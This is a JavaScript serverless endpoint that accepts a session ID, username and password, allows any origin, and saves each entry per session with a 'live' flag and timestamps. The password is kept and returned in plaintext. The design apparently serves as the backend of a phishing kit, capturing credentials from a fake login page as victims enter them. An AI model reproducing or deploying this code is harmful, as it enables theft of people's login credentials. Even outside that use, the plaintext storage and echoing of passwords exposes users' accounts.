import { readState, writeState, upsertLogin } from './_lib/state.js';
import { setCors, handleOptions } from './_lib/http.js';

export default async function handler(req, res) {
  if (handleOptions(req, res)) return;
  setCors(res);

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { sessionId, username, password } = req.body || {};
  if (!sessionId) {
    return res.status(400).json({ error: 'sessionId required' });
  }

  try {
    const state = await readState();
    const existing = state.logins.find((l) => l.sessionId === sessionId);
    const entry = {
      sessionId,
      username: username ?? '',
      password: password ?? '',
      timestamp: existing?.timestamp || Date.now(),
      updatedAt: Date.now(),
      isLive: true,
    };
    upsertLogin(state, entry);
    await writeState(state);
    return res.status(200).json({ ok: true, login: entry });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: 'Failed to save. Is Vercel KV connected?' });
  }
}
